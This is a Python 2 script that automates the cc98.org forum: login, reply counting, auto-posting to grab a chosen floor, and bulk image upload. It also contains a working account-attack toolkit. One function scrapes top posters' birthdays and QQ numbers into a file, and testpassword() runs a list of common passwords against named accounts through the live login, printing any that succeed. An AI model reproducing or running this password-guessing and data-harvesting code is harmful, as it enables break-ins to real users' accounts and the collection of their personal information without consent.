# -*- coding: utf-8 -*-
import os
import urllib
import cookielib, urllib2
import re                       
import string
import time
import httplib2
from BeautifulSoup import BeautifulSoup   
import md5
import MultipartPostHandler
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import sys
from pyquery import PyQuery as pyq
from operator import itemgetter

reload(sys)
sys.setdefaultencoding('utf-8')

http = httplib2.Http('.cache')

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),MultipartPostHandler.MultipartPostHandler)
register_openers()

urllib2.socket.setdefaulttimeout(4)


# 常用密码
password = ['qwerty', 'qazwsxedc', '123456', '000000', '111111', '112358', 
			'qazwsx',  'xiaoming', 'iloveyou', 
			'admin' , 'qq123456', 'taobao' ,'root', 'wang1234',  
			'11111111', '112233', '123123', '123321', 
			'12345678', '654321', '666666', '888888', 'abcdef', 'abcabc', 
			'abc123', 'a1b2c3', 'aaa111', '123qwe',  'qweasd', 
			'222222', '333333', '444444', '555555', '777777', '999999',
			'password', 'p@ssword', 'passwd', '5201314', 'monkey', 'letmein',
			'trustno1', 'dragon', 'baseball', 'football', 'master', 'superman',
			'passw0rd', 'shadow', 'bailey', 'michael'
			]

def login(username, password):
	'''
	用于登录，会增加登录次数
	'''
	# username = raw_input("Input your name:")
	# password = getpass.getpass('Input your password:') 

	headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}
	headers['Referer'] = 'http://www.cc98.org'

	password = md5.new(password).hexdigest()

	body = {
		'a':'i',
		'u': username, 
		'p': password,
		'userhidden':2,
	}
	url = 'http://www.cc98.org/sign.asp'  
	response, content = http.request(url, 'POST', headers=headers, body=urllib.urlencode(body))

	setcookie = str(response['set-cookie'])
	headers['Cookie'] = setcookie.split(';')[0]+";"+(setcookie.split(';')[2]).split(',')[1]
	addcookie = ";BoardList=BoardID=Show; dateupnum=2 ; upNum=0"
	headers['Cookie'] = headers['Cookie']+addcookie

	headers['Connection'] = 'keep-alive'
	headers['Accept-Language'] = 'en-US,en;q=0.5'
	headers['Accept-Encoding'] = 'gzip, deflate'
	headers['Cache-Control'] = 'max-age=0'

	return headers


def geturl(BoardID,ID):
	'''
	根据板块号和帖子id得到url
	'''
	return "http://www.cc98.org/dispbbs.asp?BoardID="+str(BoardID)+"&id="+str(ID)+"&star="



def fangke(headers, url, begin, end, gauge):
	'''
	用于一路访客统计
	'''

	# 'http://www.cc98.org/dispbbs.asp?BoardID=144&id=3935688&page=&replyID=3935688&star=%d'
	links = [ url+"%d" %i for i in xrange(int(begin), int(end) + 1 ) ]
	# print links
	# 判断是否已经出现过
	mydict = {}
	# 放置结果数据
	visitors = []

	floor = 50.0 / (int(end) + 1 - int(begin))  
	print floor
	count = 0

	for url in links:
		response, content = http.request(url, 'GET', headers=headers)
		doc = pyq(content)
		
		# 设置进度条
		count += floor
		print count
		gauge.SetValue(int(count))
		

		for i in range(13,77,7):
			if doc("tr").eq(8).text().decode('utf-8') == "提示：本主题启用了“允许发言针对特定用户”功能，您可以单击“回复主题”创建针对特定用户的回复，或单击每一楼层的“答复”按钮快速创建该楼层发表者才可见的回复。":
				i += 1
			try:
				name = doc("tr").eq(i).text().decode('utf-8')
				
				if not name in mydict:
					mydict[name] = 1
					ls = doc("tr").eq(i+1).text().decode('utf-8')
					# print name,
					# print ls," : ", name
					visitoritem = [ls, name]
					visitors.append(visitoritem)
				else:
					pass
			except BaseException:
				pass
	
	return visitors


def tongji(headers, url, begin, end):
	'''
	用于统计某座楼的指定楼层间的id发帖数并由多到少排序
	'''
	links = [ url+"%d" %i for i in range(int(begin),int(end) + 1 ) ]
	mydict = {}

	for url in links:
		response, content = http.request(url, 'GET', headers=headers)

		doc = pyq(content)
		
		for i in range(13,77,7):
			if doc("tr").eq(8).text().decode('utf-8') == "提示：本主题启用了“允许发言针对特定用户”功能，您可以单击“回复主题”创建针对特定用户的回复，或单击每一楼层的“答复”按钮快速创建该楼层发表者才可见的回复。":
				i += 1

			try:
				name = doc("tr").eq(i)
				s = name.text().decode('utf-8')
				# print s,
				if not s in mydict:
					mydict[s] = 1
				else:
					mydict[s] += 1
			except BaseException:
				pass

	delstr = "管理选项 ： 修复 | 解锁 | 提升 | 下沉 | 删除 | 移动 | 高亮 | 固顶 | 总固顶 | 区固顶 | 解除保存 |"
	delstr = delstr.decode('utf-8')
	if delstr in mydict:
		del mydict[delstr.decode('utf-8')]

	mydict = sorted(mydict.iteritems(), key=itemgetter(1), reverse=True)

	return mydict


def fatie(contents,headers,BoardID,ID,face):
	'''
	用于发帖
	'''
	cookie = headers['Cookie']
	UserName = cookie[cookie.find('username=')+9:cookie.find('&usercookies=')]
	passwd = cookie[cookie.find('password=')+9:cookie.find("; A")]

	posturl = 'http://www.cc98.org/SaveReAnnounce.asp?method=fastreply&BoardID=' + str(BoardID)

	body={
		'followup': ID,
		'RootID':ID,
		'star':'1',
		'UserName':UserName,
		'passwd':passwd,
		'Expression': face, 	#'face7.gif',
		'Content': contents, 	#"自动发帖模式",#  
		'signflag':'yes'
	}

	response, content = http.request(posturl, 'POST', headers=headers, body=urllib.urlencode(body))

	if 'set-cookie' in response:
		return 1
	else:
		return 0 


def qianglou(contents, headers, lou, BoardID, ID, face):
	'''
	抢楼函数，用于抢某楼层，一定几率失败
	'''
	lous = [lou]
	url = geturl(BoardID,ID)
	for lou in lous:
		lou = lou - 1

		while 1:
			try:
				response, content = http.request(url, 'GET', headers=headers)
				soup = BeautifulSoup(content)
				get = soup.find("span", {"id":"topicPagesNavigation"}).find("b").string

				get = int(get)
				if (lou - get) < 10:
					print "close  :" + str(lou - get)
					if (lou - get) <= 0:
						try:
							print "发帖"
							ok = fatie(contents,headers,BoardID,ID,face)
							if ok:
								print COLOR_GREEN + "done" + COLOR_NONE
							else:
								print COLOR_RED + "failed" + COLOR_NONE
							print "发帖结束"
							break
						except BaseException:
							pass
				elif (lou - get) > 50:
					print "far away  :" + str(lou - get)
					time.sleep(30)
				elif (lou - get) > 30:
					time.sleep(10)
				elif (lou - get) > 10:
					print "far away  :" + str(lou - get)
					time.sleep(3)
			except BaseException:
				pass


def upload(position,upfile):
	'''
	上传图片的函数
	'''
	datagen,headers2 = multipart_encode({
		"file1": open(position,'rb'),
		})

	headers.update(headers2)

	request = urllib2.Request("http://www.cc98.org/saveannouce_upfile.asp?boardid=477",datagen,headers)

	page = urllib2.urlopen(request).read()
	soup = BeautifulSoup(page)

	script = str(soup.findAll('table')[0].find('script'))

	begin = script.find('\'')
	end = script.rfind('\'')
	upfile.write(script[(begin+1):(end)])
	time.sleep(1)

def bianli(rootDir):
	'''
	用于遍历文件夹并上传,需要函数upload()
	'''
	upfile = open("upfile",'w')
	for lists in os.listdir(rootDir): 
		path = os.path.join(rootDir, lists)
		
		if os.path.isdir(path): 
			bianli(path)
		else:
			try:
				upload(path,upfile)
				print((COLOR_YELLOW + "UPLOAD: %s " + COLOR_GREEN + "SUCCESS" + COLOR_NONE)%path)
			except BaseException:
				pass 
	upfile.close()


def htmldecode(string):
	'''
	用于html解码：例如"&#37202;&#36807;&#19977;&#24033;" 转成中文为 “酒过三巡”
		就是将数字转换为16进制成为unicode
	'''

	# s="&#37202;&#36807;&#19977;&#24033;".replace(" ",'') 
	s = string.replace(" ",'')
	# import re
	_=re.compile('&#(x)?([0-9a-fA-F]+);')
	to_str=lambda s,charset='utf-8':_.sub(lambda result:unichr(int(result.group(2),result.group(1)=='x' and 16 or 10)).encode(charset) ,s)
	# print to_str(s)
	return to_str(s)


def getinfomation(headers, name):
	'''
	用于得到id信息：用“用户等级”作为参考
	'''

	url = "http://www.cc98.org/dispuser.asp?name="

	idurl = url + name

	idresponse, idcontent = http.request(idurl, 'GET', headers=headers)
	idcontent = BeautifulSoup(idcontent)
	get = idcontent.findAll("td", {"class":"tablebody1"}, {"style":"line-height:150%"})[1]
		
	for br in get.findAll('br'):
		next = br.nextSibling
		beg = next.find("用户等级：")
		if beg == 0:
			# print name, next[beg + 6 :] + ','
			return next[beg + 6 :]


def getname(headers):
	'''
	从发帖排行找到ID，然后得到生日，QQ，并存入文本。具体作用自己分析
	'''
	url = "http://www.cc98.org/toplist.asp?orders=1&page="

	file = open('id.txt','w+')
	links = [ url+"%d" %i for i in xrange(100, 150 ) ]

	for link in links:
		response, content = http.request(link, 'GET', headers=headers)
		soup = BeautifulSoup(content)
		get = soup.findAll("td", {"class":"tablebody1"})

		for i in xrange(0,100,5):
			userid = get[i]
			endurl = userid.find("a")['href'] 
			idurl = "http://www.cc98.org/" + endurl
			idresponse, idcontent = http.request(idurl, 'GET', headers=headers)
			idcontent = BeautifulSoup(idcontent)
			name = get[i].find("a").string
			name = pyq(name).text()

			# 输入ID
			file.write(name)

			bir = idcontent.findAll("td", {"class":"tablebody1"}, {"style":"line-height:150%"})[-1] 
			for br in bir.findAll('br'):
				next = br.nextSibling
				beg = next.find("生 日： ")
				if beg == 0:
					pyear = next.find(" 年")
					pmon = next.find(" 月")
					pday = next[pmon:].find(" 日")
					year = next[beg+5 : pyear]
					mon = next[pyear+2 : pmon]
					day = next[pmon+2 : pday+pmon]
					if year != '':
						# print "year = " + year
						# print "mon = " + mon
						# print "day = " + day

						# 输入生日
						file.write(" : " + year + mon + day)


				beg = next.find("QQ ： ")
				if beg == 0:
					qq = next[beg+5 :]
					# print qq
					# 输入QQ
					file.write(" : " + qq + '\n')

	file.close()


def testpassword(password, name):
	'''
	测试密码是否正确，如正确：打印
	'''
	for i in password:
		if len(password) >=6 :
			headers = login(name, i)
			if headers['Cookie'].find('aspsky=usercookies=&useranony=&userid=&userhidden=&password=&username=;') == 0:
				# print "No"
				pass
			else:
				print name,i

# 该模块可以读取文件指定行
# filename = 'id.txt'
# import linecache
# line = linecache.getline(filename, i)
